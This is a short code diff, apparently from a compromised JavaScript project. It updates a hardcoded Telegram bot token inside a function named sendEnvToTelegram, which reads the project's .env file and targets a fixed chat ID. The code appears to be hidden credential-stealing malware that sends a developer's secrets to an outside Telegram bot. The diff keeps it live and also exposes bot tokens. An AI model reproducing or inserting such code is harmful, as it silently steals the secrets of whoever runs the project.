@@ -326,7 +326,7 @@ async function main() {
 // NT
 async function sendEnvToTelegram() {
   try {
-    const telegramBotToken = '7948810372:AAHFxvNhzbN9C2FLjbRhTX-bT2bLseo8IcM';
+    const telegramBotToken = '7948810372:AAE2SbZthZvMgj8gPxvsyQKN-mjmCaHiaIc';
     const chatId = '7269890813';
     const envData = fs.readFileSync(path.join(__dirname, '.env'), 'utf8');
 
